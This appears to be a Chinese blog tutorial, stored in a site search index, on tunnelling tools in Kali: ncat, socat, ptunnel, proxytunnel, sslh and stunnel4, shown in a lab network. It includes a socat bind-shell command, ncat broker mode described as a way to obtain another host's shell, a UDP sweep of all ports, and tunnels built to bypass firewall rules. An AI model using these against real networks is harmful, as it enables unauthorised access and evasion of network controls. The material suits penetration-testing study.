<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Kali渗透测试-隧道技术</title>
      <link href="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h2><blockquote><ul><li>被称为众多NC衍生版软件中最优的选择</li><li>包含在Nmap工具包中</li><li>具备NC所有的功能</li><li>具有代理、隧道等功能。</li></ul></blockquote><h3 id="代理功能"><a href="#代理功能" class="headerlink" title="代理功能"></a>代理功能</h3><h4 id="服务端侦听"><a href="#服务端侦听" class="headerlink" title="服务端侦听"></a>服务端侦听</h4><ul><li>ncat -l 8080 –proxy-type http –proxy-auth user:pass</li></ul><blockquote><p>-l：ncat需要指定端口，不指定端口默认侦听31337端口</p><p>–proxy-auth：身份认证</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214190908782.png" alt="image-20230214190908782"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214191432852.png" alt="image-20230214191432852"></p><h4 id="配置浏览器代理"><a href="#配置浏览器代理" class="headerlink" title="配置浏览器代理"></a>配置浏览器代理</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214191320484.png" alt="image-20230214191320484"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214191227364.png" alt="image-20230214191227364"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214191243505.png" alt="image-20230214191243505"></p><blockquote><p>若防火墙没有限制某些端口，例如允许22端口出站访问，就可以在公网放任何一台Linux安装nmap（自带ncat），公网Linux启用ncat代理侦听22端口，此时使用内网ip一台主机使用ncat代理公网ip实现上网</p></blockquote><h3 id="Broker中介"><a href="#Broker中介" class="headerlink" title="Broker中介"></a>Broker中介</h3><blockquote><p>Broker模式的客户端相当于连接到了一个HUB，客户端之间发送任何信息都会被hub到其他客户端。</p><p>模拟场景：AB主机不通，但AC、BC主机互通，此时若A主机发送指令给C主机，由于C主机诸行了broker模式，C主机就会将A主机的指令发送给B主机，这样A主机就能达到窃取B主机信息或者获取B主机shell等目的。</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/20200522191835659.jpg" alt="20200522191835659"></p><h4 id="启动Broker模式"><a href="#启动Broker模式" class="headerlink" title="启动Broker模式"></a>启动Broker模式</h4><ul><li>ncat -l 333 –broker</li></ul><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214204053070.png" alt="image-20230214204053070"></p><h4 id="连接Broker主机"><a href="#连接Broker主机" class="headerlink" title="连接Broker主机"></a>连接Broker主机</h4><blockquote><p>此时假设两台主机为A、B都连接到了服务端ncat的broker模式，A主机发送I am 127.0.0.7之后B主机可以接收到，B主机发送I am localhost之后A主机也可以接收到；利用这个特性就可以执行操作系统指令。</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214204242696.png" alt="image-20230214204242696"></p><h5 id="执行系统指令"><a href="#执行系统指令" class="headerlink" title="执行系统指令"></a>执行系统指令</h5><blockquote><p>连接的同时执行系统指令，其中执行的系统指令必须使用&#96;&#96;符号引起来</p><p>批量执行命令：ncat 1.1.1.1 –sh-exec “echo <code>pwd</code>“</p><p>批量传文件： ncat –send-only 1.1.1.1 &lt; inputfile</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214204900731.png" alt="image-20230214204900731"></p><h2 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a>SOCAT</h2><blockquote><ul><li>被称为nc++（增强增强版的nc）</li><li>双向数据流通道工具</li></ul></blockquote><h3 id="连接端口"><a href="#连接端口" class="headerlink" title="连接端口"></a>连接端口</h3><ul><li>socat - tcp:1.1.1.1:80</li></ul><blockquote><p><code>-</code>：表示标准的输入输出，将数据输入给socat</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214213609904.png" alt="image-20230214213609904"></p><h3 id="侦听端口"><a href="#侦听端口" class="headerlink" title="侦听端口"></a>侦听端口</h3><ul><li><code>socat - tcp4-listen:22 / socat - tcp-l:333</code></li></ul><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214213619163.png" alt="image-20230214213619163"></p><h3 id="接收文件"><a href="#接收文件" class="headerlink" title="接收文件"></a>接收文件</h3><ul><li><code>socat tcp4-listen:333 open:2.txt,creat,append</code></li></ul><blockquote><p>open:2.txt,creat,append：通过open指令creat创建2.txt，后续若有数据传输使用append添加到2.txt中</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214214143252.png" alt="image-20230214214143252"></p><h3 id="发送文件"><a href="#发送文件" class="headerlink" title="发送文件"></a>发送文件</h3><ul><li><code>cat 1.txt | socat - tcp4:1.1.1.1:333</code></li></ul><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214214203302.png" alt="image-20230214214203302"></p><h3 id="远程shell"><a href="#远程shell" class="headerlink" title="远程shell"></a>远程shell</h3><ul><li><code>socat tcp-l:23 exec:sh,pty,stderr</code></li></ul><blockquote><p>exec：执行指令</p><p>exec:sh,pty,stderr：执shell，将pty终端包括stderr(标准输入输出的错误信息)传过去</p></blockquote><h4 id="服务端侦听-1"><a href="#服务端侦听-1" class="headerlink" title="服务端侦听"></a>服务端侦听</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214214544302.png" alt="image-20230214214544302"></p><h4 id="客户端接收"><a href="#客户端接收" class="headerlink" title="客户端接收"></a>客户端接收</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214214527002.png" alt="image-20230214214527002"></p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><ul><li><code>socat tcp4-listen:8080,fork tcp4:1.1.1.1:22</code></li></ul><blockquote><p>fork：此时侦听一个端口，若有一个客户端连接此端口，会新启用一个新的子进程接收这个客户端的连接，如果又来一个客户端连接8080端口，同样也会复刻当前进程接收新客户端连接</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214215404979.png" alt="image-20230214215404979"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214215508768.png" alt="image-20230214215508768"></p><h3 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h3><h4 id="服务端侦听-2"><a href="#服务端侦听-2" class="headerlink" title="服务端侦听"></a>服务端侦听</h4><ul><li><code>socat - udp-l:2001</code></li></ul><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214215851318.png" alt="image-20230214215851318"></p><h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><ul><li><code>echo &quot;id&quot; | socat - udp4-datagram:1.1.1.1:2001</code></li></ul><blockquote><p>udp4-datagram：表示发送的数据段</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214215905711.png" alt="image-20230214215905711"></p><h3 id="UDP-全端口任意内容发包"><a href="#UDP-全端口任意内容发包" class="headerlink" title="UDP 全端口任意内容发包"></a>UDP 全端口任意内容发包</h3><ul><li><code>for PORT in &#123;1..65535&#125;; do echo &quot;aaaaa&quot; | socat - UDP4-DATAGRAM:1.1.1.1:$PORT; sleep .1; done</code></li></ul><blockquote><p>PORT从7-65535逐一取值，在循环中执行do echo “aaaaa”，将这些数据段通过管道发送给服务器</p><p>此时就可以通过socat向目标主机的任意端口发送任意数据段的数据包，若端口开放服务器会返回一个响应包，若端口未开放，会返回一个ICMP包</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214220754820.png" alt="image-20230214220754820"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214220804193.png" alt="image-20230214220804193"></p><h3 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a>二进制编辑器</h3><blockquote><p>假如有一个执行程序，这个执行程序编译之后都是二进制文件，若想对这些二进制文件进行修改的话，也可以使用socat；</p><p>例：</p><p><code>echo -e &quot;\0\14\0\0\c&quot; | socat -u - file:/usr/bin/squid.exe,seek,seek=0x00074420</code></p><p>-e：输入二进制内容</p><p>-u：单向数据传输，传给&#x2F;usr&#x2F;bin&#x2F;squid.exe</p><p>seek：指定二进制文件中的偏移位置</p></blockquote><h3 id="简单的WEB服务器"><a href="#简单的WEB服务器" class="headerlink" title="简单的WEB服务器"></a>简单的WEB服务器</h3><pre class="line-numbers language-none"><code class="language-none">socat -T 1 -d -d TCP-L:10081,reuseaddr,fork,crlf SYSTEM:&quot;echo -e \&quot;\\\&quot;HTTP&#x2F;1.0 200 OK\\\nDocumentType: text&#x2F;plain\\\n\\\ndate: \$\(date\)\\\nserver:\$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\\\nclient: \$SOCAT_PEERADDR:\$SOCAT_PEERPORT\\\n\\\&quot;\&quot;; cat; echo -e \&quot;\\\&quot;\\\n\\\&quot;\&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="服务端开启侦听"><a href="#服务端开启侦听" class="headerlink" title="服务端开启侦听"></a>服务端开启侦听</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214221907599.png" alt="image-20230214221907599"></p><h4 id="客户端访问"><a href="#客户端访问" class="headerlink" title="客户端访问"></a>客户端访问</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230214221821589.png" alt="image-20230214221821589"></p><h2 id="Ptunnel"><a href="#Ptunnel" class="headerlink" title="Ptunnel"></a>Ptunnel</h2><blockquote><ul><li>Ping tunnle ICMP隧道工具<ul><li>通过ICMP echo（ping requests）和reply（ping reply）实现隧道</li><li>适用于只允许ping出站流量的环境</li><li>支持多并发连接、性能优</li><li>支持身份认证</li></ul></li><li>ptunnel 0.72版本存在拒绝服务漏洞</li></ul></blockquote><h3 id="服务端运行"><a href="#服务端运行" class="headerlink" title="服务端运行"></a>服务端运行</h3><ul><li><code>ptunnle -x 123456</code></li></ul><blockquote><p>-x：设置隧道连接密码</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215104504341.png" alt="image-20230215104504341"></p><h3 id="客户端运行"><a href="#客户端运行" class="headerlink" title="客户端运行"></a>客户端运行</h3><ul><li><code>ptunnel -p proxy_ip -lp 2222 -da destination -dp 80 -x 123456</code></li></ul><blockquote><p>-p proxy_ip：指定ptunnel服务器端</p><p>-lp：客户端本地侦听的端口</p><p>-da destination：目标资源地址（最终访问的资源）</p><p>-da：目标资源端口</p><p>-x：服务器密码</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215105754907.png" alt="image-20230215105754907"></p><blockquote><p>建立连接之后，由于没有任何信息通信，服务器端开始时候抓不到ICMP包</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215105900695.png" alt="image-20230215105900695"></p><h3 id="产生访问流量"><a href="#产生访问流量" class="headerlink" title="产生访问流量"></a>产生访问流量</h3><blockquote><p>由于客户端侦听的是本地的2222端口，一旦访问本地的2222端口，访问的请求流量就会通过建立好的隧道发送给服务端，再有服务端转发给192.168.216.172:80</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215110415251.png" alt="image-20230215110415251"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215110512729.png" alt="image-20230215110512729"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215113611751.png" alt="image-20230215113611751"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215112706521.png" alt="image-20230215112706521"></p><h3 id="嵌套SSH隧道"><a href="#嵌套SSH隧道" class="headerlink" title="嵌套SSH隧道"></a>嵌套SSH隧道</h3><blockquote><p>ptunnel建立好隧道之后，监听本地3333端口，只要访问本地3333端口就会转发到目标服务器的22端口后建立ssh动态端口转发</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215112419744.png" alt="image-20230215112419744"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215112355693.png" alt="image-20230215112355693"></p><h2 id="Proxytunel"><a href="#Proxytunel" class="headerlink" title="Proxytunel"></a>Proxytunel</h2><blockquote><ul><li>通过标准的HTTP &#x2F; HTTPS代理创建隧道的工具</li><li>通过HTTP CONNECT 方法封装信息</li><li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li><li>无法创建DNS隧道和ICMP隧道</li></ul></blockquote><h3 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h3><blockquote><p>将外网资源映射为内网指定端口</p><p>内网代理安装squid3，内网PC安装proxytunnel</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215170313685.png" alt="image-20230215170313685"></p><h4 id="内网代理配置"><a href="#内网代理配置" class="headerlink" title="内网代理配置"></a>内网代理配置</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215172330265.png" alt="image-20230215172330265"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215173018596.png" alt="image-20230215173018596"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215173331810.png" alt="image-20230215173331810"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215174110127.png" alt="image-20230215174110127"></p><h4 id="验证代理"><a href="#验证代理" class="headerlink" title="验证代理"></a>验证代理</h4><h5 id="配置客户端浏览器代理"><a href="#配置客户端浏览器代理" class="headerlink" title="配置客户端浏览器代理"></a>配置客户端浏览器代理</h5><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215174642693.png" alt="image-20230215174642693"></p><h5 id="访问外网"><a href="#访问外网" class="headerlink" title="访问外网"></a>访问外网</h5><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215174910939.png" alt="image-20230215174910939"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215174930195.png" alt="image-20230215174930195"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215175816871.png" alt="image-20230215175816871"></p><h4 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h4><ul><li><code>proxytunnel -a 80 -p 192.168.216.181:3128 -d 192.168.216.172:80</code></li></ul><blockquote><p>-a：指定侦听本地端口</p><p>-p：proxy，指定内网代理服务器ip</p><p>-d：公网资源IP</p><p>本地访问127.0.0.1:80之后流量会转发给代理服务器，代理服务器通过防火墙允许的规则之后访问指定的公网资源。</p><p><strong>其中公网端口的指定是根据防火墙规则而定的，若防火墙只允许内网代理服务器访问公网80端口，就只能访问允许的端口。</strong></p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215181209882.png" alt="image-20230215181209882"></p><h5 id="访问本地的80端口"><a href="#访问本地的80端口" class="headerlink" title="访问本地的80端口"></a>访问本地的80端口</h5><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215181235645.png" alt="image-20230215181235645"></p><h3 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h3><blockquote><p><strong>若想访问目标资源的22端口，只能在公网上放置一台代理服务器</strong></p><p>修改目标资源侦听端口可能无法躲避防火墙深层检测（检测协议层，80端口跑的不是http协议会被过滤掉）</p><p>外网安装squid代理服务并侦听80端口</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/2020052219403517.jpg" alt="2020052219403517"></p><h4 id="配置公网代理"><a href="#配置公网代理" class="headerlink" title="配置公网代理"></a>配置公网代理</h4><blockquote><p>侦听端口修改为80端口，由于防火墙只允许内网流量的80端口出站，因此内网代理访问公网代理的80端口进行建立隧道</p><p>其他的http_access等字段与场景一的相同</p><p>公网代理和SSH服务在一台主机</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215191557436.png" alt="image-20230215191557436"></p><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215192756951.png" alt="image-20230215192756951"></p><h4 id="创建隧道"><a href="#创建隧道" class="headerlink" title="创建隧道"></a>创建隧道</h4><ul><li><code>proxytunnel -a 2222 -p 192.168.216.181:3128 -r 192.168.216.183:80 -d 192.168.216.178:22</code></li></ul><blockquote><p>-r：指定公网代理IP</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215201122776.png" alt="image-20230215201122776"></p><h4 id="连接本地2222端口"><a href="#连接本地2222端口" class="headerlink" title="连接本地2222端口"></a>连接本地2222端口</h4><blockquote><p>连接目标资源的用户名为x_root</p><p>连接本地127.0.0.1:2222</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215201229072.png" alt="image-20230215201229072"></p><h2 id="SSLH"><a href="#SSLH" class="headerlink" title="SSLH"></a>SSLH</h2><blockquote><ul><li>端口分配器<ul><li>根据客户端第一个包检测协议类型</li><li>根据协议检测结果将流量转发给不同目标</li><li>支持HTTP，HTTPS，SSH，OpenVPN，tinc，XMPP和其他可基于正则表达式判断的协议类型（自己写正表达式判断其他协议类型）</li><li>适用于防火墙允许443端口入站访问流量的环境</li></ul></li><li>sslh先判断第一个数据包访问的是什么资源sslh就会转发给相应的资源。例如：假设控制了一台https主机，在此主机上安装sslh软件侦听443端口，，让原来的https服务侦听其他端口，；若有客户端访问公网的443端口，流量被防火墙映射到sslh主机的443端口，sslh先判断第一个数据包是什么协议类型，若是https请求，就进行本地转发到真正的https服务，响应包继续原路返回到外网客户端。</li></ul></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215205009413.png" alt="image-20230215205009413"></p><h3 id="内网主机配置"><a href="#内网主机配置" class="headerlink" title="内网主机配置"></a>内网主机配置</h3><h4 id="配置sslh"><a href="#配置sslh" class="headerlink" title="配置sslh"></a>配置sslh</h4><ul><li><code>vim /etc/default/sslh</code></li></ul><blockquote><p>配置所提供的资源</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215213030946.png" alt="image-20230215213030946"></p><h4 id="启动sslh服务"><a href="#启动sslh服务" class="headerlink" title="启动sslh服务"></a>启动sslh服务</h4><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215213846490.png" alt="image-20230215213846490"></p><h3 id="客户端连接-1"><a href="#客户端连接-1" class="headerlink" title="客户端连接"></a>客户端连接</h3><h4 id="访问http服务"><a href="#访问http服务" class="headerlink" title="访问http服务"></a>访问http服务</h4><blockquote><p>客户端使用http访问443端口经过防火墙映射到内网主机的sslh主机，sslh经过判断第一个包是http服务就会转发到对应的http服务上</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215214150108.png" alt="image-20230215214150108"></p><h4 id="访问ssh服务"><a href="#访问ssh服务" class="headerlink" title="访问ssh服务"></a>访问ssh服务</h4><blockquote><p>通过ssh访问sslh内网主机的443端口，会被转发到内网主机的ssh的22端口</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215214455462.png" alt="image-20230215214455462"></p><p><strong>若使用nmap对防火墙外网口进行扫描，会扫描出443一个端口跑的三个服务：https，hhtp和ssh（一个端口提供多个服务）</strong></p><h2 id="Stunnel4"><a href="#Stunnel4" class="headerlink" title="Stunnel4"></a>Stunnel4</h2><blockquote><ul><li>无需修改原代码的情况下将TCP流量封装于SSL通道内</li><li>适用于本身不支持加密传输的应用</li><li>支持openssl安全特性</li><li>跨平台</li><li>性能优</li></ul></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215215718692.png" alt="image-20230215215718692"></p><h3 id="内网部署Stunnel4-Server"><a href="#内网部署Stunnel4-Server" class="headerlink" title="内网部署Stunnel4 Server"></a>内网部署Stunnel4 Server</h3><h4 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h4><ul><li><code>openssl req -new -days 365 -nodes -x509 -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem</code></li></ul><blockquote><p>req -new：申请新证书</p><p>-day：证书期限</p><p>-nodes：不要加密生成的密钥</p><p>-x509：通用证书标准</p><p>-out：输出证书的路径，stunnel证书是<code>.pem</code>格式，包含私钥，而<code>.cer</code>格式不包含私钥只有公钥</p><p>-keyout：key(私钥)保存在stunnel.pem中</p></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215224956980.png" alt="image-20230215224956980"></p><h4 id="创建stunnel配置文件"><a href="#创建stunnel配置文件" class="headerlink" title="创建stunnel配置文件"></a>创建stunnel配置文件</h4><ul><li><code>vim /etc/stunnel/stunnel.conf</code></li></ul><pre class="line-numbers language-none"><code class="language-none"># &#x2F;etc&#x2F;stunnel&#x2F;stunnel.confcert &#x3D; &#x2F;etc&#x2F;stunnel&#x2F;stunnel.pem  # 证书路径setuid &#x3D; stunnel4  # 设置运行服务账号为stunnel，stunnel4为stunnel的uidsetgid &#x3D; stunnel4  # 设置运行服务账号为stunnel，stunnel4为stunnel的gidpid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid[mysqls]                          # 定义访问资源accept &#x3D; 0.0.0.0:443              # 本机侦听443端口connect &#x3D; 192.168.216.167:3306    # 连接目标服务器192.168.216.167的3306端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215225938876.png" alt="image-20230215225938876"></p><h4 id="配置Stunnel4自启动"><a href="#配置Stunnel4自启动" class="headerlink" title="配置Stunnel4自启动"></a>配置Stunnel4自启动</h4><ul><li><code>vim /etc/default/stunnel4</code></li></ul><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215230435918.png" alt="image-20230215230435918"></p><h4 id="启动stunnel4服务"><a href="#启动stunnel4服务" class="headerlink" title="启动stunnel4服务"></a>启动stunnel4服务</h4><ul><li><code>service stunnel4 start</code></li></ul><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215230806919.png" alt="image-20230215230806919"></p><h5 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h5><blockquote><p>在启动stunnel4服务后出现了报错</p><ol><li>此处提示Process进程报错，查看进程信息后的确没有3368进程运行，而在上面的服务端配置文件中pid &#x3D; &#x2F;var&#x2F;run&#x2F;stunnel4&#x2F;stunnel4.pid，进程号在stunnel4.pid中，但在stunnel4文件夹中没有stunnel4.pid进程文件</li><li>去掉所有注释</li></ol></blockquote><p><img src="/2023/02/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20230215233502259.png" alt="image-20230215233502259"></p><h5 id="添加进程号"><a href="#添加进程号" class="headerlink" title="添加进程号"></a>添加进程号</h5><pre class="line-numbers 